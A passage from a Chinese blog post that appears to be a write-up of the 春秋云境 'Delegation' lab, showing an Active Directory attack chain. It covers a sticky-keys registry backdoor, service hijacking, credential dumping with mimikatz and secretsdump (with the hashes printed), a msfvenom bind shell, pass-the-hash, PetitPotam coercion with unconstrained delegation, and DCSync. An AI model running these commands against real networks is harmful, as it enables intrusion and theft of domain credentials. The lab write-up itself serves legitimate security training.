+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG ADD <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后修改注册表指向构造的恶意程序并触发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="hljs-string">&quot;C:\Users\Adrian\Desktop\evil.exe&quot;</span> /f<br><br>sc start gupdate<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-6.png" srcset="/img/loading.gif" lazyload></p>
+<p>在锁屏登录界面触发粘滞键，创建一个管理员账户</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-7.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后用新账户登录获得 flag02</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-8.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取机器账号的ntlm hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;&quot;</span>privilege::debug<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="hljs-string">&quot;&quot;</span> <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-11.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>方法二：导出 sam 后解密</strong></p>
+<p>reg save 导出注册表文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg save hklm\system C:\Users\Adrian\Desktop\system<br>reg save hklm\sam C:\Users\Adrian\Desktop\sam<br>reg save hklm\security C:\Users\Adrian\Desktop\security<br></code></pre></td></tr></table></figure>
+
+<p>生成三个文件</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-9.png" srcset="/img/loading.gif" lazyload></p>
+<p>secretsdump 解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/aa]<br>└─# impacket-secretsdump LOCAL -system system -sam sam -security security<br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Target system bootKey: 0x08092415ee8b9b2ad2f5f5060fb48339<br>[*] Dumping <span class="hljs-built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::<br>Adrian:1003:aad3b435b51404eeaad3b435b51404ee:91ff0fb948167eb4d080b5330686c02f:::<br>dr0n1:1005:aad3b435b51404eeaad3b435b51404ee:91ff0fb948167eb4d080b5330686c02f:::<br>[*] Dumping cached domain logon information (domain/username:<span class="hljs-built_in">hash</span>)<br>XIAORANG.LAB/Aldrich:$DCC2<span class="hljs-variable">$10240</span>#Aldrich#e4170181a8bb2a24e6113a9b4895307a: (2022-06-24 03:18:39+00:00)<br>[*] Dumping LSA Secrets<br>[*] <span class="hljs-variable">$MACHINE</span>.ACC <br><span class="hljs-variable">$MACHINE</span>.ACC:plain_password_hex:c88127bd7a03fc13f05366e685978844f6e29892af09c62f9fadb3e111c34bb3d8a99d8f0d9e91cddb91a2236201baa0e9a83b9668a00a8f30bd3ec9444712d9620347431168caf4827cab00e22a4b8b761d8458a1dbdc81094b7ee267db2fd2606a2024eb7496eece3ce8a83638b255eb2c77a5d33a8b651410f5bd88c7876d9cf412e371a25f5f0e97421656682e3ba0ddeb302eb6050e6214eb5e6bf27c7a1e6ef899bcd78d186e2e6304379c283bc103d9c4cb5635632e186bd05c78325b0eb800174546b09dc0c0a7ff55f8393a739058a1d9e52dd74fc6951ad83106b9519b5041251d17abf464e768f845b334<br><span class="hljs-variable">$MACHINE</span>.ACC: aad3b435b51404eeaad3b435b51404ee:b6cbbcf7b4b326a08b3d81147196d5a4<br>[*] DPAPI_SYSTEM <br>dpapi_machinekey:0x4af114bade59102b7c64e41cde94be2257337fab<br>dpapi_userkey:0x372392e560b616ecd27b6ec0fe138ef86790b565<br>[*] NL<span class="hljs-variable">$KM</span> <br> 0000   56 4B 21 B3 87 A3 29 41  FD 91 8F 3A 2D 2B 86 CC   VK!...)A...:-+..<br> 0010   49 4A EE 48 6C CD 9C D7  C7 DA 65 B6 62 4D 35 BD   IJ.Hl.....e.bM5.<br> 0020   09 F7 59 68 23 69 DE BA  2D 47 84 47 29 AD 5D AE   ..Yh#i..-G.G).].<br> 0030   A0 5F 19 CA 21 13 E4 6D  01 27 C3 FC 0C C1 0F 2E   ._..!..m.<span class="hljs-string">&#x27;......</span><br><span class="hljs-string">NL$KM:564b21b387a32941fd918f3a2d2b86cc494aee486ccd9cd7c7da65b6624d35bd09f759682369deba2d47844729ad5daea05f19ca2113e46d0127c3fc0cc10f2e</span><br><span class="hljs-string">[*] Cleaning up... </span><br></code></pre></td></tr></table></figure>
+
+<p><strong>方法三：生成一个正向马</strong></p>
+<p>生成马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/bind_tcp LPORT=7788 -f exe &gt; evil.exe<br></code></pre></td></tr></table></figure>
+
+<p>启动 proxychains4 msfconsole</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOST 172.22.4.45<br><span class="hljs-built_in">set</span> LPORT 7788<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p>session 存活时间很短，所以要迁移进程</p>
+<p>ps 后 migrate 一个 system 的进程</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-17.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取 hash</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-18.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<p>以上三种方法都差不多，都可以获取 hash</p>
+<p>跑一下 SharpHound</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 impacket-psexec administrator@172.22.4.45 -hashes <span class="hljs-string">&quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot;</span> -codec gbk<br><br>SharpHound.exe -c all<br></code></pre></td></tr></table></figure>
+
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-10.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到 WIN19 和 DC01 的 Allows Unconstrained Delegation 都是开启的</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-12.png" srcset="/img/loading.gif" lazyload></p>
+<p>想在图形化界面使用工具先用 mimikatz pth 一下 hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz<br>privilege::debug<br>sekurlsa::pth /user:WIN19$ /domain:<span class="hljs-string">&quot;xiaorang.lab&quot;</span> /ntlm:b6cbbcf7b4b326a08b3d81147196d5a4<br></code></pre></td></tr></table></figure>
+
+
+<p>或者使用 AdFind 等工具查看委派</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\AdFind.exe -b <span class="hljs-string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName<br></code></pre></td></tr></table></figure>
+
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-13.png" srcset="/img/loading.gif" lazyload></p>
+<p>Rubeus 开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe monitor /interval:1 /filteruser:DC01$<br></code></pre></td></tr></table></figure>
+
+<p>PetitPotam 或者 dfscoerce 等强制触发</p>
+<p>这里写主机名可以成功，而 ip 则不行，不知道是什么原因。可能和 RPC&#x2F;SPN&#x2F;SMB 协商有关系？一个是 <code>\\WIN19\IPC$</code> ，另一个是 <code>\\172.22.4.45\IPC$</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 python PetitPotam.py -d xiaorang.lab -u WIN19$ -hashes aad3b435b51404eeaad3b435b51404ee:b6cbbcf7b4b326a08b3d81147196d5a4 WIN19 172.22.4.7<br><br>proxychains4 python dfscoerce.py -d xiaorang.lab -u WIN19$ -hashes aad3b435b51404eeaad3b435b51404ee:b6cbbcf7b4b326a08b3d81147196d5a4 WIN19 172.22.4.7<br></code></pre></td></tr></table></figure>
+
+<p>收到后 ptt 就可以 dcsync 了</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-14.png" srcset="/img/loading.gif" lazyload></p>
+<p>域控 hash</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">502 </span>    krbtgt  <span class="hljs-number">767e06</span>b9c74fd628dd13785006a9092b        <span class="hljs-number">514</span><br><span class="hljs-symbol">1105 </span>   Aldrich <span class="hljs-number">98</span>ce19dd5ce74f670d230c7b1aa016d0        <span class="hljs-number">512</span><br><span class="hljs-symbol">1106 </span>   Marcus  b91c7cc463735bf0e599a2d0a04df110        <span class="hljs-number">512</span><br><span class="hljs-symbol">1112 </span>   WIN-<span class="hljs-number">3</span>X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        <span class="hljs-number">4096</span><br><span class="hljs-symbol">1113 </span>   WIN-YUUAW2QG9MF$        <span class="hljs-number">125d0</span>e9790105be68deb6002690fc91b        <span class="hljs-number">4096</span><br><span class="hljs-symbol">1000 </span>   DC01$   fb866f1272c40150b915f50d5d36ccff        <span class="hljs-number">532480</span><br><span class="hljs-symbol">500 </span>    Administrator   <span class="hljs-number">4889</span>f6553239ace1f7c47fa2c619c252        <span class="hljs-number">512</span><br><span class="hljs-symbol">1104 </span>   WIN19$  b6cbbcf7b4b326a08b3d81147196d5a4        <span class="hljs-number">528384</span><br><span class="hljs-symbol">1103 </span>   FILESERVER$     <span class="hljs-number">69</span>aaa197a5b4388d001151979abb05b8        <span class="hljs-number">4096</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="FILESERVER（172-22-4-19）"><a href="#FILESERVER（172-22-4-19）" class="headerlink" title="FILESERVER（172.22.4.19）"></a>FILESERVER（172.22.4.19）</h2><p>PTH</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 impacket-smbexec xiaorang.lab/administrator@172.22.4.19 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk<br><br><span class="hljs-built_in">type</span> c:\<span class="hljs-built_in">users</span>\Administrator\flag\flag03.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-15.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="DC（172-22-4-7）"><a href="#DC（172-22-4-7）" class="headerlink" title="DC（172.22.4.7）"></a>DC（172.22.4.7）</h2><p>PTH</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 impacket-smbexec xiaorang.lab/administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk<br><br><span class="hljs-built_in">type</span> c:\<span class="hljs-built_in">users</span>\Administrator\flag\flag04.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Delegation-16.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+        <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" class="print-no-link">#春秋云境</a>
+      
+        <a href="/tags/%E4%B8%93%E4%B8%9A%E5%BE%BD%E7%AB%A0/" class="print-no-link">#专业徽章</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云境 Delegation</div>
+      <div>https://www.dr0n.top/posts/58271769/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>dr0n</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年6月26日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年7月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                    <i class="iconfont icon-cc-nd"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/574bbb7a/" title="域渗透学习(DACL篇)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">域渗透学习(DACL篇)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/a12d2be3/" title="春秋云境 Certify">
+                        <span class="hidden-mobile">春秋云境 Certify</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="module">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://cdn.jsdelivr.net/npm/@waline/client@v3/dist/waline.css')
+      import('https://cdn.jsdelivr.net/npm/@waline/client@v3/dist/waline.js').then(({ init }) => {
+        var options = Object.assign(
+          {"serverURL":"https://waline.dr0n.top/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick","mail"],"lang":"zh-CN","emoji":["//unpkg.com/@waline/emojis@1.0.1/qq","//unpkg.com/@waline/emojis@1.0.1/bilibili"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="openkounter-site-pv-container" style="display: none">
+        总访问量 
+        <span id="openkounter-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="openkounter-site-uv-container" style="display: none">
+        总访客数 
+        <span id="openkounter-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022002247号
+    </a>
+  </span>
+  
+    
+      <span class="beian-police">
+        
+          <span style="visibility: hidden; width: 0">|</span>
+          <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+        
+        <span class="beian-police">浙公网安备33021202003790号</span>
+      </span>
+    
+  
+</div>
+
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/openkounter.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
